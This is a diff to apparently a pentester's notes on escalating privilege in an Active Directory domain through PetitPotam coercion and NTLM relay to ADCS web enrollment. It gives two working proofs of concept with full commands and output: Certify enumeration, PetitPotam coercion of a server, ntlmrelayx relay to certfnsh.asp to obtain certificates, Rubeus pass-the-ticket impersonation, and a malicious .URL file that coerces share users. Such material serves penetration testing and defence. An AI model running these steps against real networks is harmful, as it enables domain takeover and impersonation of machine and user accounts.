@@ -1,20 +1,31 @@
-===============================================================================================================================
-Domain Privesc - Active Directory Certificate Services (ADCS) + PetitPotam + NLTM Relay technique
-===============================================================================================================================
+==========================================================================================================================================
+Domain Privesc -  PetitPotam + NLTM Relay to ADCS (Active Directory Certificate Services)
+==========================================================================================================================================
 
-To complete...
-
-
-Conditions making an AD environment vulnerable to ADCS + NTLM relay attack
----------------------------------------------------------------------------
+Conditions making an AD environment vulnerable to "NLTM Relay to ADCS" attacks
+-------------------------------------------------------------------------------
 > ADCS is configured to allow NTLM authentication;
 > NTLM authentication is not protected by EPA (Extended Protection for Authentication) and SMB signing;
 > ADCS is running either of these services:
   + Certificate Authority Web Enrollment
   + Certificate Enrollment Web Service
 
+Usefull tools
+---------------
+> Certify.exe (https://github.com/GhostPack/Certify)
+> PetitPotam.py (https://github.com/topotam/PetitPotam)
+> Ntlmrelayx.py (https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
+> Rubeus.exe (https://github.com/GhostPack/Rubeus)
 
-C:\temp>Certify.exe cas /domain:company.work /ldapserver:dc1.company.work /path:CN=Configuration,DC=company,DC=work /showAllPermissions
+==========================================================================================================================================
+PoC 1 - Basic test with the tools "Certify.exe", "PetitPotam.py", "Ntlmrelayx.py" and "Rubeus.exe"
+==========================================================================================================================================
+
+-------------------------------------------------------------------------------------------------------------------------------------
+Step 1. Validate that the AD Certificate Services are running and that the Certificate Authority Web Enrollment is enabled 
+-------------------------------------------------------------------------------------------------------------------------------------
+
+C:\temp> Certify.exe cas /domain:company.work /ldapserver:dc1.company.work /path:CN=Configuration,DC=company,DC=work /showAllPermissions
    _____          _   _  __
   / ____|        | | (_)/ _|
  | |     ___ _ __| |_ _| |_ _   _
@@ -111,7 +122,15 @@ C:\temp>Certify.exe cas /domain:company.work /ldapserver:dc1.company.work /path:
 
 Certify completed in 00:00:18.1508451
 
-====================================================================
+
+Then validate that the Certificate Authority Web Enrollment is enabled and working by browsing the following URL:
+-----------------------------------------------------------------------------------------------------------------
+=> http://dc1.company.work/certsrv/certfnsh.asp or http://192.168.1.167/certsrv/certfnsh.asp
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------
+Step 2. Coerce the target Windows server "ORACLESERVER1" (192.168.1.51) to authenticate to a Kali Linux machine running the tool "ntlmrelayx.py"
+------------------------------------------------------------------------------------------------------------------------------------------------
 
 jeff@kali:~/Documents/Tools$ python3 ./PetitPotam.py -u lowprivdomainuser -p Welcome2 -d company 192.168.1.30 192.168.1.51
               ___            _        _      _        ___            _                     
@@ -134,6 +153,9 @@ jeff@kali:~/Documents/Tools$ python3 ./PetitPotam.py -u lowprivdomainuser -p Wel
 [+] Got expected ERROR_BAD_NETPATH exception!!
 [+] Attack worked!
 
+------------------------------------------------------------------------------------------------------------------------------------------------------------
+Step 3. Use the tool "ntlmrelayx.py" to relay the authentication request from the victim server to the ADCS and collect a certificate for the victim server
+------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 jeff@kali:~/Documents/Tools/impacket/examples$ sudo python3 ./ntlmrelayx.py -t http://192.168.1.167/certsrv/certfnsh.asp -smb2support --adcs --template Machine
 Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
@@ -188,11 +210,23 @@ JjD0vDorWpchgYpwlQuNXarNPO2fVZ0cHb47Q3t+egxd9l6lJi21fO6yOHuYCy7z8vm9L1cpDjpyB5oe
 Zw824vsu6rvqjiPaiPioSt8rhVCgeaJfb/6JW7sHbvII/8Stk9EpkTP7r4XxzJcqK4/G0tJ48nxawVMo/5GATorIhX2gqp02vj40ArdsOmZCKWQLaoVFMMf6nY/6pX2DCkOq6/KcWsETPPHVhCpRa8yUWN
 <SNIP>
 
+=> The attack worked and we collected a certificate for the victim machine account "COMPANY\ORACLESERVER1$". 
 
-===============================================================================
 
-Network file share 
-------------------
+Step 4. Impersonate the victim machine account "COMPANY\ORACLESERVER1$" using the tool "Rubeus.exe"
+--------------------------------------------------------------------------------------------------------
+
+C:\temp> .\Rubeus.exe asktgt /outfile:kirbi /user:ORACLESERVER1$ /ptt /certificate:MIIRFQIBAzCCEM8GCSqGSIb3DQEHAaCCEMAEgh<SNIP>
+
+
+==========================================================================================================================================
+PoC 2 - Basic test with a ".URL" file and the tools "Ntlmrelayx.py" and "Rubeus.exe"
+==========================================================================================================================================
+
+Step 1. Add a malicious ".URL" file in an unrestricted network file share that will coerce victim users (when they browse the file share) 
+        to authenticate to a Kali Linux machine running the tool "ntlmrelayx.py"
+------------------------------------------------------------------------------------------------------------------------------------------
+
 $ cat MaliciousURLfile.url
 [InternetShortcut]
 URL=http://192.168.1.30
@@ -201,6 +235,8 @@ IconFile=\\192.168.1.30\share\auditor.ico
 IconIndex=1
 
 
+Step 2. Use the tool "ntlmrelayx.py" to relay the authentication request from the victim users to the ADCS and collect a certificate for the victim users
+------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 jeff@kali:~/Documents/Tools/impacket/examples$ sudo python3 ./ntlmrelayx.py -t http://192.168.1.167/certsrv/certfnsh.asp -smb2support --adcs --template User
 Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
@@ -256,3 +292,11 @@ f3gA3DcIbCyzcfIBToPJtU/vkaDVHSogU+13XtfjZwPCr0XfBdLqfMOKI/wetuADyQ5JCxZNvPSjb0/f
 e/6Zkq4TrEWiC69wecFyOUC7UbItLCpF1xWvl8UJA1sdB4LHrKh/n70xxA4BHvN1yaRlOQrUczF3Dg04ZaMXTVPkIfOFPlu77Px3HfakbwVh+fsVh8CnPZ91/qtm1F13383yz5FhNj8vPMafDc+N+rh/yg
 6mk470WX3KdsHsmIE8QSkGxxYkpsbGXF3fg9/DIpLLh+DJZC0CReh6dt0bhAYTGZhI/Zhkrp9Tag2wxa+q6dnEW8CKAZ+UqdTFIxQxTcJPRiCEbuBzZLXu/4U6l1Q89LHkbsRWDmiATcGvG8SU5EC6sQmE
 <SNIP>
+
+=> The attack worked and we collected a certificate for the victim user account "COMPANY\CLAUDIA.CARDINALE". 
+
+
+Step 3. Impersonate the victim user account using the tool "Rubeus.exe"
+-------------------------------------------------------------------------------------
+
+C:\temp> .\Rubeus.exe asktgt /outfile:kirbi /user:CLAUDIA.CARDINALE /ptt /certificate:MIIRrQIBAzCCEWcGCSqGSIb3DQEHA<SNIP>
